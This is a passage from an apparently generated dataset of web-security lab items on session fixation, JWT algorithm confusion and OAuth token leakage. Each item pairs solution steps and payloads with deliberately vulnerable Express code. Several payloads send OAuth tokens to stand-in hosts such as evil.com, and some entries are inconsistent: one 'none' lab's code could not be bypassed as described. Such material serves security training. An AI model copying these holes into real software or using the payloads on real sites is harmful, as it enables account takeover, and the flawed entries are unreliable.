  "Lab Description": "The application integrates third-party OAuth login but does not invalidate existing session cookies during the authentication redirect chain. The application reuses an attacker-controlled session post-login. To solve: Fixate a session via the redirect endpoint and access the victim's account page after they complete OAuth login.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Intercept the initial GET /auth/oauth/redirect request in Burp Suite and note the Set-Cookie: session=XYZ behavior before authentication.",
    "Send the request to Burp Repeater and manually inject your session cookie into the response with a fixed value.",
    "Craft a malicious OAuth URL that sends the victim through the login flow while binding your session cookie in the initial redirect.",
    "Use social engineering to get the victim to complete the OAuth flow using the crafted URL.",
    "Once the victim completes the OAuth flow, access the /account endpoint using the same session cookie and confirm access to the victim's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'fixationkey', resave: false, saveUninitialized: true })); app.get('/auth/oauth/redirect', (req, res) => { if (!req.session.user) { req.session.oauthState = 'init'; res.redirect('https://auth.provider.com/login?redirect_uri=/auth/callback'); } else { res.redirect('/account'); } }); app.get('/auth/callback', (req, res) => { req.session.user = { username: 'carlos' }; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send('Welcome ' + req.session.user.username); }); app.listen(3000, () => console.log('OAuth Fixation Lab running'));",
  "payloads": [
    "GET /auth/oauth/redirect HTTP/1.1\\nHost: vulnerable-site.com\\nCookie: session=attacker123",
    "https://vulnerable-site.com/auth/oauth/redirect?next=/auth/callback (sent to victim)",
    "Access /account using Cookie: session=attacker123 after victim OAuth login"
  ]
},
{
  "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
  "Lab Description": "The backend improperly trusts the 'alg' header in JWT tokens, allowing attackers to switch the algorithm from RS256 to HS256 and sign tokens with a known public key. To solve: Forge a JWT for the 'admin' user and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a JWT during login using Burp Suite. Decode it using jwt.io or Postman.",
    "Inspect the 'alg' header and observe it uses 'RS256'.",
    "Extract the embedded 'kid' value or use the known public key from the /.well-known endpoint if available.",
    "Modify the JWT header to use 'HS256' instead of 'RS256'.",
    "Sign a new JWT for the 'admin' user using the public key as the HMAC key.",
    "Send the forged JWT in Authorization: Bearer header to /admin-dashboard and verify admin access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); try { const decoded = jwt.verify(token, pubKey); req.user = decoded; next(); } catch (err) { res.status(403).send('Invalid token'); } }); app.get('/admin-dashboard', (req, res) => { if (req.user.username !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome admin!'); }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
  "payloads": [
    "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"username\": \"admin\" }",
    "Sign with HMAC using public key from /.well-known/jwks.json or /public.pem",
    "Authorization: Bearer [forged_token]"
  ]
},
{
  "Lab scenario": "OAuth Token Disclosure via Open Redirect in Redirect URI",
  "Lab Description": "The OAuth client incorrectly validates redirect URIs, allowing attackers to inject a redirect endpoint that leaks access tokens. To solve: Capture an OAuth token by redirecting the victim’s login flow to your controlled domain.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Find the login flow that redirects to /oauth/authorize?redirect_uri=... and test for open redirect injection using tools like OWASP ZAP.",
    "Inject your attacker-controlled domain (e.g., https://evil.com) into the redirect_uri parameter.",
    "Craft a phishing link to https://vulnerable.com/oauth/authorize?redirect_uri=https://evil.com/callback",
    "Deploy a token-capturing listener on your domain to capture the OAuth access_token from the fragment/hash.",
    "After capturing the access token, use it as a Bearer token to access the victim's /account endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthTokens = {}; app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'token-' + Math.random().toString(36).substring(2); oauthTokens[token] = { username: 'carlos' }; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; const token = auth?.split(' ')[1]; if (!token || !oauthTokens[token]) return res.status(403).send('Access denied'); res.send('Welcome ' + oauthTokens[token].username); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running'));",
  "payloads": [
    "https://vulnerable.com/oauth/authorize?redirect_uri=https://evil.com/callback",
    "GET /account HTTP/1.1\\nAuthorization: Bearer token-[captured]",
    "Set up https://evil.com to log access_token from fragment"
  ]
},
  {
    "Lab scenario": "Session fixation via password reset endpoint",
    "Lab Description": "The application's session management fails to invalidate active sessions post-password reset. The application assigns a new session ID only after login, allowing an attacker to exploit a fixed session during password reset. To solve: Fixate a session prior to victim login and hijack their session post-reset to access their dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to send a GET /reset-password request while logged out and capture the Set-Cookie response containing the session ID.",
      "2. Use Burp Proxy to initiate a password reset request for carlos using this fixed session ID and wait for the victim to reset their password.",
      "3. Once the victim logs in, reuse the same session ID captured previously to gain access to the victim’s session.",
      "4. Confirm session fixation worked by navigating to /dashboard with the hijacked session.",
      "5. Capture the session token and validate access to carlos's account via Burp Repeater."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixedsession', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'oldpass' }]; app.post('/reset-password', (req, res) => { const { username } = req.body; req.session.username = username; res.send('Password reset initiated. Check your email.'); }); app.post('/update-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send('Password updated.'); } else { res.status(400).send('User not found'); } }); app.get('/dashboard', (req, res) => { if (req.session.username) return res.send('Dashboard for ' + req.session.username); res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "GET /reset-password",
      "POST /reset-password username=carlos",
      "POST /update-password username=carlos&newPassword=hacked123",
      "GET /dashboard (with hijacked session cookie)"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via 'none' algorithm injection",
    "Lab Description": "The backend JWT validation logic fails to properly enforce algorithm verification. An attacker can craft a JWT with 'alg':'none' and bypass verification, gaining unauthorized access. To solve: Forge a JWT token using 'none' algorithm and access Carlos’s admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in using a normal user account and capture the Authorization JWT token using Burp.",
      "2. Decode the JWT using jwt.io or Burp Decoder to observe its structure, especially the alg field.",
      "3. Modify the JWT header to set 'alg':'none' and the payload to impersonate carlos (e.g., {\"username\":\"carlos\"}).",
      "4. Remove the JWT signature part entirely and recombine the header and payload using Base64.",
      "5. Use Postman to send a GET /admin request with the modified JWT as Bearer token in Authorization header.",
      "6. Confirm successful privilege escalation by accessing Carlos’s admin panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecure'; const users = [{ username: 'carlos', role: 'admin' }, { username: 'wiener', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(auth, secret, { algorithms: ['HS256'] }); if (decoded.role === 'admin') return res.send('Welcome Admin: ' + decoded.username); res.status(403).send('Access denied'); } catch { res.status(400).send('JWT error'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64(header).base64(payload).",
      "GET /admin with Authorization: Bearer [unsigned_token]"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header",
    "Lab Description": "This lab uses the OAuth 2.0 implicit grant type. The access token is returned in the fragment of the redirect URI and exposed via Referer headers during subsequent navigation. To solve: Capture the access token of Carlos from a referer leak and access /account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to spider the OAuth flow and confirm the use of implicit grant by observing token returned in URI fragment.",
      "2. Inject a malicious redirect_uri pointing to an attacker-controlled domain with an embedded redirect to a non-HTTPS resource.",
      "3. Wait for Carlos to authorize and follow the redirection which leaks the token in Referer header to the attacker domain.",
      "4. Extract the token from HTTP access logs or intercept it using Burp Collaborator.",
      "5. Replay the stolen token via GET /account with Authorization Bearer header and confirm account access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const users = { 'carlos': { id: 1, email: 'carlos@local', role: 'user' } }; app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (response_type === 'token') { const token = Math.random().toString(36).substr(2); tokens[token] = 'carlos'; const redirect = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(redirect); } else { res.status(400).send('Unsupported flow'); } }); app.get('/account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const user = tokens[auth]; if (user === 'carlos') return res.send('Welcome carlos'); res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Token Leak Lab running on http://localhost:' + PORT));",
    "payloads": [
      "https://vulnerable.site/auth?response_type=token&client_id=123&redirect_uri=http://evil.com/capture.html",
      "Leaked access_token from Referer: http://evil.com/capture.html#access_token=abc123",
      "GET /account with Authorization: Bearer abc123"
    ]
  },
{
"Lab scenario": "Session Fixation via Weak Session Handling in Login Flow",
"Lab Description": "This lab’s session management is flawed, allowing attackers to fixate a session ID before login. The application issues a session cookie during pre-login activities but fails to regenerate it upon successful authentication, allowing fixation attacks. To solve: hijack Carlos's session by planting a known session ID and then accessing his account page after login.",
"Difficulty Level": "Medium",
"Solution Steps": [
"1. Using Burp Suite, intercept the initial GET /login request and observe that a session cookie is issued before authentication.",
"2. Use Burp's Repeater to manually set a custom predictable session ID (e.g., sessionid=attackersession) and send a POST /login with Carlos’s credentials.",
"3. Confirm that the session ID remains the same after login by inspecting the response headers and subsequent cookies.",
"4. Plant the same session ID in your own browser.",
"5. Access the /my-account page and verify you are logged in as Carlos."
],
"Vulnerability name": "Authentication",
"srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substring(2)); } res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { res.send('Account details for session: ' + req.cookies.sessionid); }); const PORT = 5000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
"payloads": [
"Set-Cookie: sessionid=attackersession",
"POST /login HTTP/1.1 with sessionid=attackersession",
"Access /my-account with sessionid=attackersession"
]
},
{
"Lab scenario": "JWT Algorithm Confusion Exploit in Authorization Token",
"Lab Description": "This lab’s JWT validation is vulnerable due to algorithm confusion. It accepts unsigned tokens if alg is set to 'none'. The application incorrectly processes JWTs during authentication without verifying the algorithm correctly. To solve: forge a token to access Carlos's account without needing his password.",
"Difficulty Level": "Hard",
"Solution Steps": [
"1. Using Postman, retrieve your JWT from a legitimate login flow and inspect the header and payload.",
"2. Decode the token with jwt.io and observe the algorithm field in the header (e.g., HS256).",
"3. Modify the alg field to 'none' and set the payload's username to 'carlos'.",
"4. Resign the token without a signature and use it as the Authorization header value.",
"5. Send a GET /my-account request using the forged JWT and verify you have accessed Carlos’s account."
],
"Vulnerability name": "Authentication",
"srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send('Account details for ' + decoded.payload.username); } else { jwt.verify(token, secret, (err, user) => { if (err) return res.status(403).send('Invalid token'); res.send('Account details for ' + user.username); }); } }); const PORT = 5001; app.listen(PORT, () => console.log('JWT Algorithm Confusion Lab running on http://localhost:' + PORT));",
"payloads": [
"JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
"JWT payload: {\"username\":\"carlos\"}",
"Authorization: Bearer [forged_token]"
]
},
{
"Lab scenario": "OAuth Implicit Flow Token Leakage via Referrer Header",
"Lab Description": "This lab’s OAuth 2.0 implementation improperly leaks access tokens via the HTTP Referer header. The application uses the implicit grant flow without restricting referrer policies. An attacker can steal tokens embedded in the URL fragment. To solve: steal Carlos's OAuth access token and use it to access his protected resource.",
"Difficulty Level": "Hard",
"Solution Steps": [
"1. Use OWASP ZAP to proxy the OAuth authentication flow and observe that access_token is returned in the URL fragment (#access_token=...).",
"2. Create an HTML page that embeds a malicious iframe pointing to the OAuth endpoint with redirect_uri set to your domain.",
"3. Host the malicious page and send it to Carlos.",
"4. When Carlos authenticates, capture the Referer header containing his token.",
"5. Replay the access_token using a GET /protected-resource?access_token=[token] request and access Carlos's private data."
],
"Vulnerability name": "Authentication",
"srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const accessToken = Math.random().toString(36).substring(2); res.redirect(redirect_uri + '#access_token=' + accessToken); }); app.get('/protected-resource', (req, res) => { const accessToken = req.query.access_token; if (!accessToken) { res.status(401).send('Missing access token'); return; } res.send('Protected data for token: ' + accessToken); }); const PORT = 5002; app.listen(PORT, () => console.log('OAuth Token Leakage Lab running on http://localhost:' + PORT));",
"payloads": [
"<iframe src=\"http://victim-site.com/oauth/authorize?client_id=abc&redirect_uri=http://attacker.com/callback\"></iframe>",
"Capture Referer header with access_token",
"GET /protected-resource?access_token=[captured_token]"
]
},
{
  "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
  "Lab Description": "The application uses JWT-based session tokens for user authentication. It mistakenly supports multiple algorithms, including `none`, without enforcing a strict verification policy. The application accepts unsigned JWTs if the `alg` is set to `none`, allowing attackers to forge tokens. To solve: Forge a JWT to impersonate the user 'carlos' and access their account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept JWT after login using Burp Suite and observe the token structure in the Authorization header.",
    "Decode the JWT and observe that it uses the HS256 algorithm and includes a 'sub' claim for the logged-in user.",
    "Craft a new JWT with 'alg' set to 'none' and 'sub' set to 'carlos', then remove the signature portion.",
    "Use Postman to send a request to /account with the forged token in the Authorization header.",
    "Verify successful login as carlos and access the /account page to confirm exploitation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = [{ username: 'carlos', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send('Welcome Carlos!'); res.send('Welcome user'); } catch (err) { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('JWT Confusion Lab running'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
    "Authorization: Bearer <unsigned_token_with_alg_none>"
  ]
},
{
  "Lab scenario": "Session fixation via cookie parameter injection",
  "Lab Description": "The session management mechanism fails to regenerate session identifiers upon login, allowing an attacker to fix a session ID in advance. The application accepts a session cookie from unauthenticated users and keeps it valid post-authentication. To solve: Log in as carlos using a pre-fixed session ID and access their profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to generate a valid session ID by visiting the login page as an unauthenticated user.",
    "Send a phishing request to carlos including a link with the pre-set session ID in the cookie header.",
    "Wait for carlos to log in, causing the session ID to be upgraded to an authenticated state.",
    "Reuse the same session ID to access the /profile endpoint as carlos.",
    "Confirm access to carlos’s profile page to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'carpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid'); const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('sid', sid); res.send('Logged in'); }); app.get('/profile', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username === 'carlos') return res.send('Carlos Profile Data'); res.send('Not authorized'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "Cookie: sid=predefinedsessionid",
    "POST /login with predefined sid cookie",
    "GET /profile with same sid cookie"
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via redirect_uri manipulation",
  "Lab Description": "The application uses an OAuth 2.0 implicit flow but improperly validates redirect URIs. The attacker can manipulate the redirect_uri parameter to capture access tokens using their controlled endpoint. To solve: Leak an OAuth token belonging to carlos and use it to access their profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth authorization request.",
    "Modify the redirect_uri parameter to an attacker-controlled domain (e.g., https://evil.com/callback).",
    "Send a phishing link to carlos and wait for token leakage via fragment (#access_token=...).",
    "Extract the access token from logs on evil.com.",
    "Use Postman to send a GET request to /profile with the leaked token in the Authorization header."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const tokens = {}; const users = [{ username: 'carlos' }]; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = crypto.randomBytes(16).toString('hex'); tokens[token] = 'carlos'; return res.redirect(`${redirect_uri}#access_token=${token}`); } res.send('Invalid'); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos Profile Accessed'); res.status(401).send('Unauthorized'); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running'));",
  "payloads": [
    "https://vuln.site/authorize?response_type=token&client_id=abc&redirect_uri=https://evil.com/callback",
    "GET /profile with Authorization: Bearer <leaked_token>"
  ]
},
{
  "Lab scenario": "Session fixation in password reset flow",
  "Lab Description": "The application allows attackers to fix a session identifier before a user resets their password. The password reset handler reuses the existing session without invalidating or rotating it. To solve: hijack Carlos's session by setting a fixed session ID before he resets his password, then access his My account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Using Burp Suite, generate a session cookie via GET /login with no credentials. Note the session ID value.",
    "2. Visit the Forgot Password feature and submit Carlos's username to trigger a reset link.",
    "3. In Burp, intercept the password reset link request. Copy the reset token from your email panel.",
    "4. Open Burp Repeater and send the reset password request with Carlos's reset token but ensure your fixed session ID is used in the Cookie header.",
    "5. After password reset, send a request to /my-account with the same session cookie to access Carlos's account.",
    "6. Confirm lab completion when Carlos's data is shown."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'oldpass' }]; const sessions = {}; const resetTokens = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).slice(2); sessions[sid] = null; res.cookie('sid', sid); res.send('Login page'); }); app.post('/forgot', (req, res) => { const { username } = req.body; const token = Math.random().toString(36).slice(2); resetTokens[username] = token; res.send(`Reset link: /reset-password?token=${token}`); }); app.post('/reset-password', (req, res) => { const { token, newPassword } = req.body; const username = Object.keys(resetTokens).find(k => resetTokens[k] === token); if (username) { const user = users.find(u => u.username === username); user.password = newPassword; const sid = req.cookies.sid; sessions[sid] = username; res.send('Password reset'); } else { res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send(`My account: ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /login -> retrieve Set-Cookie sid=ABC123",
    "POST /reset-password with Cookie: sid=ABC123",
    "GET /my-account with Cookie: sid=ABC123"
  ]
},
{
  "Lab scenario": "JWT signature bypass using 'none' algorithm in Authorization header",
  "Lab Description": "This app accepts JSON Web Tokens for authentication, but fails to properly validate the algorithm used. The backend trusts the 'alg' field in the JWT header. To solve: craft a JWT with 'none' algorithm to impersonate the admin and access their account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Log in to your own account and capture the JWT token via Burp Suite (Authorization: Bearer ...).",
    "2. Decode the JWT and observe the header and payload. Identify the use of RS256 algorithm.",
    "3. Modify the JWT header to set 'alg' to 'none', remove the signature part, and change payload 'username' to 'admin'.",
    "4. Use Postman to send a GET /my-account request with the forged JWT in the Authorization header.",
    "5. Verify lab completion when admin's account details are returned."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: 'adminpass', user: 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, 'privateKey', { algorithm: 'RS256' }); res.json({ token }); } else res.status(401).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'privateKey', { algorithms: ['RS256'] }); res.send(`Hello ${decoded.username}`); } catch (e) { if (token.split('.').length === 2) { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Hello ${decoded.username}`); } else res.status(403).send('Invalid JWT'); } }); app.listen(4001);",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"admin\" }",
    "JWT: base64(header).base64(payload).<empty signature>"
  ]
},
{
  "Lab scenario": "OAuth access token leakage via referer header in redirect",
  "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects users to a third-party site after authentication. However, the access token is passed in the URL fragment and leaks via the HTTP referer header. To solve: intercept the token leak and use it to access the victim's profile.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp Suite and log in as a normal user. Observe the OAuth redirect request (URL contains #access_token=...).",
    "2. Note that the final redirect is to a third-party endpoint with your token in the Referer header.",
    "3. Simulate a phishing attack where Carlos logs in using a manipulated OAuth redirect_uri that points to your server.",
    "4. On your malicious server, capture the Referer header and extract Carlos's access_token.",
    "5. Replay a request to GET /profile with the stolen token in Authorization: Bearer header.",
    "6. Confirm lab completion when Carlos's profile is shown."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abc123-carlos-token'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123-carlos-token') res.send('Carlos profile data'); else res.status(403).send('Forbidden'); }); app.listen(4002);",
  "payloads": [
    "Redirect to: /oauth/callback?redirect_uri=http://evil.com/capture",
    "Capture Referer: http://evil.com/capture#access_token=abc123-carlos-token",
    "Replay: GET /profile with Authorization: Bearer abc123-carlos-token"
  ]
},

{
  "Lab scenario": "Session fixation via login endpoint parameter manipulation",
  "Lab Description": "The application's login endpoint allows an attacker to fix a session ID prior to authentication. The application reuses the existing session identifier after login without regenerating it. To solve: hijack Carlos's session using a fixed session ID to access his profile page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a GET /login request before login. Observe that the session cookie is set before authentication.",
    "2. With the session ID still valid, forward the login request and note the session cookie is retained after successful login.",
    "3. Use Burp Repeater to send a GET /login request with a fixed session ID, such as session=fix123.",
    "4. Send a phishing email to Carlos with a crafted link: https://vuln-site/login?session=fix123. Once Carlos logs in, his session is tied to fix123.",
    "5. Use Burp with session=fix123 and visit /my-profile. If successful, you access Carlos’s profile and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'admin123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-profile'); } else { res.send('Invalid'); } }); app.get('/my-profile', (req, res) => { if (req.session.user) res.send('Welcome ' + req.session.user); else res.send('Not authenticated'); }); app.listen(4000);",
  "payloads": [
    "GET /login HTTP/1.1\\nCookie: session=fix123",
    "POST /login HTTP/1.1\\nCookie: session=fix123\\nusername=carlos&password=admin123",
    "GET /my-profile HTTP/1.1\\nCookie: session=fix123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion with 'none' exploit",
  "Lab Description": "This application's JWT-based authentication accepts user-supplied tokens but does not enforce the algorithm used to verify signatures. The backend accepts the 'none' algorithm without signature verification. To solve: create a forged token to log in as the admin user.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp to capture the Authorization header after logging in with a valid account.",
    "2. Decode the JWT in jwt.io or Burp Decoder and observe the structure: header, payload, signature.",
    "3. Modify the header to include \"alg\":\"none\" and change the payload to {\"user\":\"admin\"}.",
    "4. Remove the signature portion entirely and rebuild the token as header.payload.",
    "5. Replay the modified Authorization: Bearer token to access /admin. If successful, you access the admin dashboard."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'secretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = JSON.parse(Buffer.from(payload.payload, 'base64').toString()).user; if (user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Not admin'); } try { const verified = jwt.verify(token, secret); if (verified.user === 'admin') return res.send('Admin Access Granted'); else return res.status(403).send('Forbidden'); } catch { return res.status(403).send('Invalid token'); } }); app.listen(4001);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "GET /admin HTTP/1.1\\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allowing unauthorized token usage",
  "Lab Description": "The application integrates OAuth for SSO but fails to validate the client_id and redirect_uri against a whitelist. This allows a malicious actor to reuse an issued token on a forged client. To solve: obtain a valid token and replay it against a vulnerable resource without authorization.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to initiate OAuth login and intercept the authorization flow (GET /oauth/authorize?client_id=trusted-app).",
    "2. Note the access_token in the final redirect_uri after completing login.",
    "3. Modify the client_id to a fake app (evil-client) and reuse the access_token from the legitimate flow.",
    "4. Use Postman to access /account/profile with Authorization: Bearer [reused token] and client_id=evil-client.",
    "5. Confirm access to restricted profile data tied to another client_id, proving token reusability and misconfigured validation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'c@rl0s' }]; const validClients = ['trusted-app']; app.get('/oauth/authorize', (req, res) => { const { client_id, username } = req.query; if (!username) return res.send('Login required'); const token = jwt.sign({ user: username }, 'sharedsecret'); res.redirect(`/callback?access_token=${token}`); }); app.get('/account/profile', (req, res) => { const { authorization } = req.headers; const token = authorization.split(' ')[1]; const payload = jwt.verify(token, 'sharedsecret'); if (!payload || !payload.user) return res.status(403).send('Invalid'); res.send('Profile of ' + payload.user); }); app.listen(4002);",
  "payloads": [
    "GET /oauth/authorize?client_id=trusted-app&username=carlos",
    "GET /callback?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "GET /account/profile HTTP/1.1\\nAuthorization: Bearer [copied_token]"
  ]
},
{
  "Lab scenario": "JWT signature disclosure in Authorization header parsing",
